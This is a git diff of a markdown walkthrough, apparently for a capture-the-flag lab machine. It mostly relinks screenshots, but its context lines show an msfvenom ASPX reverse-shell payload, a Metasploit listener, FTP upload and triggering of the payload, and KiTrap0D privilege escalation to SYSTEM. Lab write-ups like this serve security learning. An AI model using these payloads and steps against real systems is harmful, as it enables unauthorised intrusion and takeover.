@@ -71,7 +71,7 @@ List the contents.
 ftp> ls
 ```
 
-![FTP Files](Images/ftp_listing.png)
+![FTP Files](Images/ftp_logged-in.png)
 
 Output:
 
@@ -158,7 +158,7 @@ iisstart.htm
 welcome.png
 ```
 
-![FTP Listing](Images/ftp_listing_after_upload.png)
+![FTP Listing](Images/ftp_webshell-upload.png)
 
 The upload completes successfully.
 
@@ -225,6 +225,8 @@ While the command shell is useful for enumeration, it is cumbersome for post-exp
 
 Generate an ASPX Meterpreter payload.
 
+![FTP Upload Payload](Images/msfvenom_payload.png)
+
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp \
 LHOST=10.10.14.160 \
@@ -233,9 +235,10 @@ LPORT=8888 \
 > devel.aspx
 ```
 
-![MSFVenom](Images/msf-payload_exec.png)
 
 Configure a Metasploit listener.
+
+![Handler](Images/msf-options.png)
 
 ```text
 use exploit/multi/handler
@@ -246,7 +249,6 @@ set LPORT 8888
 
 run
 ```
-![Handler](Images/msf-options.png)
 
 Upload the generated payload through FTP.
 
@@ -263,12 +265,15 @@ Trigger the payload by visiting:
 ```
 http://10.129.242.143/devel.aspx
 ```
+![MSFVenom](Images/msf-payload_exec.png)
 
 Metasploit receives a reverse connection.
 
 ```
 Meterpreter session 1 opened
 ```
+
+![MSF Reverse shell ](Images/msf-revshell.png)
 
 A stable Meterpreter shell is now established, providing a solid foothold for local enumeration and privilege escalation.
 
@@ -332,7 +337,7 @@ set SESSION 2
 run
 ```
 
-![Local Exploit Suggester](Images/13_local_exploit_suggester.png)
+![Local Exploit Suggester](Images/msf-session.png)
 
 The module reports several potential exploits, including:
 
@@ -342,6 +347,7 @@ exploit/windows/local/ms13_053_schlamperei
 exploit/windows/local/ms13_081_track_popup_menu
 ...
 ```
+![MSFVenom](Images/suggester.png.png)
 
 Among these, **MS10-015 (KiTrap0D)** is applicable to the target operating system and provides a straightforward route to SYSTEM privileges.
 
@@ -377,7 +383,7 @@ Run the exploit.
 run
 ```
 
-![Exploit Configuration](Images/14_kitrap0d_options.png)
+![Exploit Configuration](Images/suggester-worked.png.png)
 
 After successful execution, Metasploit establishes a new privileged Meterpreter session.
 
